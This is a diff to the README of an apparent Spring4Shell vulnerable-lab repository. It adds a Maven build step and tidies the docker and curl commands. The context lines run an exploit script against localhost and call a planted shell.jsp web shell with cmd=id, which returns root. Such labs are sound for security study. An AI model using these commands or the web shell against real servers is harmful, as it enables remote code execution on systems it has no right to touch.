@@ -3,7 +3,11 @@
 ## Getting started
 
 ```bash
-$ docker build . -t spring4shell && docker run -p 8080:8080 spring4shell
+$ mvn clean install
+```
+
+```bash
+$ docker build . -t spring4shell && docker run -p 8080:8080 --rm spring4shell
 ```
 
 ```bash
@@ -24,7 +28,8 @@ $ python3 exploit.py --url "http://localhost:8080/helloworld/greeting"
 ```
 
 ```bash
-$ curl http://localhost:8080/shell.jsp\?cmd\=id --output -                                                                                                                                     ✭ ✱
+$ curl http://localhost:8080/shell.jsp\?cmd\=id --output -
+# or browser
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
